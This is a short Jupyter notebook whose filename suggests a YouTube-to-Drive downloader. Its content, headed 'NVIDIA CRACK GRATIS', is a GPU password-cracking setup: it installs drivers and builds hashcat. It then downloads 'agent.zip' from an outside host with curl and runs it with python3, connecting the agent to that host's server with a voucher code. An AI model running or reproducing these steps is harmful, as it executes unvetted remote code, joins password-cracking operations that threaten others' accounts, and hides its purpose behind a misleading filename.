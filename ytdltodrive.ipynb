# NVIDIA CRACK GRATIS :
!apt install pciutils -y
!lspci | grep NVIDIA
!apt install -y nvidia-driver nvidia-cuda-toolkit
!apt install cmake build-essential -y
!apt install checkinstall git -y
!git clone https://github.com/hashcat/hashcat.git && cd hashcat && make -j 8 && make install
!hashcat -b -m 0
!curl https://thaithai.xyz/hash/agents.php?download=1 -o agent.zip
!python3 agent.zip --url https://thaithai.xyz/hash/api/server.php --voucher KODE
